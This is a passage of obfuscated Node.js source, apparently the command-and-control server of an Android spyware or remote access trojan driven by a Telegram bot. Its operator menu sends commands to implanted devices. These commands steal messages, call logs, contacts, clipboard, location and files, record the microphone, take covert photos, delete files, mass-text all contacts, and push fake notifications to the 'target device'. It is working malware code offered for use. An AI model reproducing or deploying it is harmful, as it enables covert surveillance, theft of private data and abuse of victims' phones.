      '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE5B\uD835\uDE64\uD835\uDE67 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A : <b>' +
        (appClients.get(_0x39894d)?.model || 'Unknown') +
        '</b>',
      {
        width: 10000,
        chat_id: id,
        message_id: _0x440ba5.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              { text: '\uD835\uDE3C\uD835\uDE65\uD835\uDE65\uD835\uDE68', callback_data: 'apps:' + _0x39894d },
              { text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE5E\uD835\uDE63\uD835\uDE5B\uD835\uDE64', callback_data: 'device_info:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE42\uD835\uDE5A\uD835\uDE69 \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A', callback_data: 'file:' + _0x39894d },
              { text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A', callback_data: 'delete_file:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE3E\uD835\uDE61\uD835\uDE5E\uD835\uDE65\uD835\uDE57\uD835\uDE64\uD835\uDE56\uD835\uDE67\uD835\uDE59', callback_data: 'clipboard:' + _0x39894d },
              { text: '\uD835\uDE48\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A', callback_data: 'microphone:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE48\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56', callback_data: 'camera_main:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56', callback_data: 'camera_selfie:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', callback_data: 'location:' + _0x39894d },
              { text: '\uD835\uDE4F\uD835\uDE64\uD835\uDE56\uD835\uDE68\uD835\uDE69', callback_data: 'toast:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE3E\uD835\uDE56\uD835\uDE61\uD835\uDE61\uD835\uDE68', callback_data: 'calls:' + _0x39894d },
              { text: '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68', callback_data: 'contacts:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE51\uD835\uDE5E\uD835\uDE57\uD835\uDE67\uD835\uDE56\uD835\uDE69\uD835\uDE5A', callback_data: 'vibrate:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', callback_data: 'show_notification:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\uD835\uDE68', callback_data: 'messages:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A', callback_data: 'send_message:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE4B\uD835\uDE61\uD835\uDE56\uD835\uDE6E \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64', callback_data: 'play_audio:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE69\uD835\uDE64\uD835\uDE65 \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64', callback_data: 'stop_audio:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68', callback_data: 'send_message_to_all:' + _0x39894d },
            ],
          ],
        },
        parse_mode: 'HTML',
      }
    )
  }

  const directCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
  if (directCommands.includes(_0x2f3f8b)) {
    appSocket.clients.forEach(function (client) {
      if (client.uuid == _0x39894d) client.send(_0x2f3f8b)
    })
    appBot.deleteMessage(id, _0x440ba5.message_id)
    sendWaitMsg()
  }

  if (_0x2f3f8b == 'send_message') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E\n\n\u2022ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
      { reply_markup: { force_reply: true } }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'send_message_to_all') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
      { reply_markup: { force_reply: true } }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'file') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\n\n\u2022 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
      { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'delete_file') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A\n\n\u2022 ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
      { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'microphone') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59\n\n\u2022 ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
      { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'toast') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n\u2022 ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
      { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'show_notification') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\n\n\u2022 ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
      { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
    )
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'play_audio') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E\n\n\u2022 ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
      { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
    )
    currentUuid = _0x39894d
  }
})

function sendWaitMsg() {
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
    {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'],
          ['\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'],
        ],
        resize_keyboard: true,
      },
    }
  )
}

// 🛡 Keep Server Alive Pinger 
setInterval(function () {
  appSocket.clients.forEach(function _0x3b936c(_0x41c8f7) {
    if (_0x41c8f7.readyState === webSocket.OPEN) {
        _0x41c8f7.send('ping')
    }
  })
  try {
    const myUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 8999}`;
    axios.get(myUrl).catch(()=> {})
  } catch (_0x1c37e3) {}
}, 5000)

appServer.listen(process.env.PORT || 8999)
